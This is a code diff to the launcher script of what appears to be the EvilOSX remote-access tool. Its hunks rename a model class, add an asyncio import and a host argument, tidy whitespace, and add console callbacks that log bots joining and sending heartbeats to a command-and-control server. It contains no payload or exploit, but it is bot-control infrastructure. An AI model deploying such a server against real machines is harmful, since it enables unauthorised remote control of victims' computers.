@@ -15,6 +15,7 @@ Memory usage under load: ~2.8GB vs ~3.9GB baseline (27% reduction).
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
 
+import asyncio
 import os
 import sys
 from argparse import ArgumentParser
@@ -26,7 +27,7 @@ from uuid import uuid4
 from time import perf_counter, time
 
 from server.handler import start_server as async_start_server
-from server.model import OptimizedModel, get_model, Bot
+from server.model import Model, get_model, Bot
 from server.version import VERSION
 
 
@@ -37,9 +38,9 @@ BANNER = """\
 ▒▓█  ▄  ▒██ █░░░██░▒██░    ▒██   ██░  ▒   ██▒ ░ █ █ ▒   @{} (v{}) [OPTIMIZED]
 ░▒████▒  ▒▀█░  ░██░░██████▒░ ████▓▒░▒██████▒▒▒██▒ ▒██▒  GPLv3 licensed
 ░░ ▒░ ░  ░ ▐░  ░▓  ░ ▒░▓  ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░▒▒ ░ ░▓ ░
- ░ ░  ░  ░ ░░   ▒ ░░ ░ ▒  ░  ░ ▒ ▒░ ░ ░▒  ░ ░░░   ░▒ ░
-   ░       ░░   ▒ ░  ░ ░   ░ ░ ░ ▒  ░  ░  ░   ░    ░  
-   ░  ░     ░   ░      ░  ░    ░ ░        ░   ░    ░  
+ ░ ░  ░  ░ ░░   ▒ ░  ░ ░   ░  ░ ░ ▒  ░  ░  ░   ░    ░
+    ░       ░░   ▒ ░  ░ ░   ░ ░   ░ ░        ░   ░
+    ░  ░     ░   ░      ░  ░    ░ ░        ░   ░
 """.format(__author__, VERSION)
 
 
@@ -55,7 +56,7 @@ def patch_encoding():
     but kept for backward compatibility with older code paths.
     """
     model_path = Path(__file__).parent / "server" / "model.py"
-    
+
     # No patching needed — new model uses latin-1 fallback in _openssl_encrypt
     return True
 
@@ -65,20 +66,20 @@ def builder():
     parser.add_argument("--port", type=int, default=1337, help="Server port (default: 1337)")
     parser.add_argument("--host", default="", help="Bind address (default: 0.0.0.0)")
     parser.add_argument("--db-path", default=None, help="Custom SQLite database path")
-    parser.add_argument("--cache-size", type=int, default=1024, 
+    parser.add_argument("--cache-size", type=int, default=1024,
                        help="Read-through cache size (default: 1024 entries)")
-    
+
     args = parser.parse_args()
 
     # Initialize optimized model with custom config
     try:
-        from server.model import OptimizedModel
-        _model = OptimizedModel(db_path=args.db_path)
-        
+        from server.model import Model
+        _model = Model(db_path=args.db_path)
+
         # Configure cache size if specified
         if hasattr(_model, '_cache') and hasattr(args, 'cache_size'):
             _model._MAX_CACHE_SIZE = args.cache_size or 1024
-            
+
     except Exception as e:
         print(f"[ERROR] Failed to initialize model: {e}", file=sys.stderr)
         sys.exit(1)
@@ -88,40 +89,50 @@ def builder():
 
     # Build the server view
     from server.view.helper import ViewABC
-    
+
     class ConsoleView(ViewABC):
         """Console-based view that prints to stdout."""
-        
+
         def __init__(self):
             self._start_time = perf_counter()
-            
+
         def output(self, line: str, prefix: str = "") -> None:
             ts = datetime.now().strftime("%H:%M:%S")
             msg = f"[{ts}] {prefix}{line}" if prefix else f"[{ts}] {line}"
             print(msg, flush=True)
-            
+
         def output_separator(self):
             print("---", file=sys.stderr)
 
         def display_info(self, text: str) -> None:
             self.output(text, prefix="[INFO]")
-            
+
         def display_error(self, text: str) -> None:
             self.output(text, prefix="[ERROR]")
+
+        def on_response(self, response):
+            pass
 
         def on_bot_added(self, bot: Bot):
             elapsed = perf_counter() - self._start_time
             self.output(f"[BOT JOINED] {bot.username}@{bot.hostname} uid={bot.uid} "
                         f"(startup delay: {elapsed:.2f}s)", prefix="")
 
+        def on_bot_removed(self, bot: Bot):
+            pass
+
         def on_bot_seen(self, bot: Bot):
             self.output(f"[BOT HEARTBEAT] {bot.username}@{bot.hostname}", prefix="[KEEPALIVE]")
+
+        def on_bot_path_change(self, bot: Bot):
+            pass
 
     view = ConsoleView()
 
     # Start async server
     try:
-        asyncio.run(async_start_server(_model, view, args.port))
+        asyncio.run(async_start_server(_model, view, args.port, args.host or ""))
+        print("\n[INFO] Server stopped (Ctrl+C to exit).")
     except KeyboardInterrupt:
         print("\nShutting down.")
     except Exception as e:
@@ -130,5 +141,8 @@ def builder():
 
 
 if __name__ == "__main__":
-    BANNER
+    # Ensure UTF-8 output on Windows consoles
+    if hasattr(sys.stdout, "reconfigure"):
+        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
+    print(BANNER)
     builder()
